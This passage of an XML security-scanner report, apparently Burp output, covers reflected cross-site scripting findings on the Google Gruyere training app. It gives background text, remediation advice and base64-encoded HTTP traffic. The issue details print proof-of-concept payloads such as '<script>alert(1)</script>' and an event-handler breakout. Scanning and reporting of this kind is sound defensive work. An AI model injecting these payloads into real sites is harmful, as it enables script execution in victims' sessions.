jMwMDgyOTU4Mzc5NTc5MjMyNiIsICJicmllIiknCiAgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+CgoKICAKICAKICAgIAogICAgCiAgICAgIDx0YWJsZT4KICAgICAgICA8dHI+PHRkIGNvbHNwYW49JzInPjxiPkFsbCBzbmlwcGV0czo8L2I+PC90ZD48L3RyPgogICAgICAgIAogICAgICAgICAgPHRyPgogICAgICAgICAgICA8dGQgdmFsaWduPSd0b3AnPgogICAgICAgICAgICAgIDxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUoMCArIDEpPC9zY3JpcHQ+Jm5ic3A7Jm5ic3A7CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgIDx0ZCB2YWxpZ249J3RvcCc+CiAgICAgICAgICAgICAgPGRpdiBpZD0nMCc+CiAgICAgICAgICAgICAgICBCcmllIGlzIHRoZSBxdWVlbiBvZiB0aGUgY2hlZXNlczxzcGFuIHN0eWxlPWNvbG9yOnJlZD4hISE8L3NwYW4+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgIAogICAgICA8L3RhYmxlPgogICAgICA8YnI+CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vbmV3cy5nb29nbGUuY29tL25ld3Mvc2VhcmNoP3E9YnJpZSc+QnJpZSdzIHNpdGU8L2E+CiAgICAKICAKCgoKPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8226283804820463616</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [uid parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>uid</b> request parameter is copied into the value of an HTML tag attribute which is an event handler and is encapsulated in single quotation marks. The payload <b>21086";alert(1)//223</b> was submitted in the uid parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Note that the input is echoed into an existing event handler within the response. JavaScript injected into this context will only execute when the relevant event occurs. This may require some action by the victim user, and may hinder exploitation. It may be possible to manually fine tune an attack to increase the likelihood that the event occurs.]]></issueDetail>
    <remediationDetail><![CDATA[Echoing user-controllable data within an event handler is inherently dangerous and can make XSS attacks difficult to prevent. The defense of HTML-encoding user-controllable data is not effective in this context, because browsers will HTML-decode the event handler string before executing it as script.  If at all possible, the application should avoid echoing user data within this context. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1jaGVkZGFyMjEwODYlMjIlM2JhbGVydCgxKSUyZiUyZjIyMyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogOGZlY2FiOGExODdlN2U4ZWQ3N2NhM2M5ODc5Zjc2NWINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDo0OSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzAzMA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIGNoZWRkYXIyMTA4NiI7YWxlcnQoMSkvLzIyMwogIAoKCjwvaDI+CjxkaXYgY2xhc3M9J3JlZnJlc2gnPjxhIGNsYXNzPSdidXR0b24nCiAgb25jbGljaz0nX3JlZnJlc2hTbmlwcGV0cygiNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2IiwgImNoZWRkYXIyMTA4NiI7YWxlcnQoMSkvLzIyMyIpJwogIGhyZWY9JyMnPlJlZnJlc2g8L2E+PC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgoKCiAgCiAgICBjaGVkZGFyMjEwODYiO2FsZXJ0KDEpLy8yMjMKICAgIGlzIG5vdCBhbiBhdXRob3IuCiAgCiAgCgoKCjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>56591353494003776</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [uid parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>uid</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>cyz3u&lt;script&gt;alert(1)&lt;/script&gt;llhga</b> was submitted in the uid parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1jaGVkZGFyY3l6M3UlM2NzY3JpcHQlM2VhbGVydCgxKSUzYyUyZnNjcmlwdCUzZWxsaGdhIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDRkNmIyMGQ1NDE5NjU1NmYxNjdlNDkyYjgxMDhlMmYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDo1MCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzA3NQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIGNoZWRkYXJjeXozdTxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5sbGhnYQogIAoKCjwvaDI+CjxkaXYgY2xhc3M9J3JlZnJlc2gnPjxhIGNsYXNzPSdidXR0b24nCiAgb25jbGljaz0nX3JlZnJlc2hTbmlwcGV0cygiNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2IiwgImNoZWRkYXJjeXozdTxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD5sbGhnYSIpJwogIGhyZWY9JyMnPlJlZnJlc2g8L2E+PC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgoKCiAgCiAgICBjaGVkZGFyY3l6M3U8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+bGxoZ2EKICAgIGlzIG5vdCBhbiBhdXRob3IuCiAgCiAgCgoKCjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2783208344984675328</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [uid parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
